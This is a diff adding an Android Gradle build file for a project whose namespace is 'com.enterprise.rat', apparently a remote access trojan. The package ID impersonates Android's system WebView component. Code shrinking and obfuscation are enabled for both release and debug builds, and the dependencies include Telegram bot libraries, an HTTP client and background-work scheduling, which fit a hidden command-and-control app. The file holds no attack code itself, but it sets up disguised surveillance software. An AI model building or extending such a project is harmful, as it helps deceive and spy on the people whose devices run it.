@@ -1,0 +1,53 @@
+plugins {
+    id 'com.android.application'
+}
+
+android {
+    namespace 'com.enterprise.rat'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.android.system.webview.core"
+        minSdk 24
+        targetSdk 34
+        versionCode 3
+        versionName "3.0-ENT"
+        multiDexEnabled true
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+        debug {
+            minifyEnabled true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_11
+        targetCompatibility JavaVersion.VERSION_11
+    }
+
+    packagingOptions {
+        exclude 'META-INF/DEPENDENCIES'
+        exclude 'META-INF/LICENSE'
+        exclude 'META-INF/LICENSE.txt'
+        exclude 'META-INF/NOTICE'
+    }
+}
+
+dependencies {
+    implementation 'org.telegram:telegrambots:6.5.0'
+    implementation 'org.telegram:telegrambots-meta:6.5.0'
+    implementation 'com.squareup.okhttp3:okhttp:4.11.0'
+    implementation 'com.google.code.gson:gson:2.10.1'
+    implementation 'androidx.work:work-runtime:2.8.1'
+    implementation 'androidx.core:core:1.12.0'
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'androidx.multidex:multidex:2.0.1'
+    implementation 'commons-io:commons-io:2.11.0'
+}
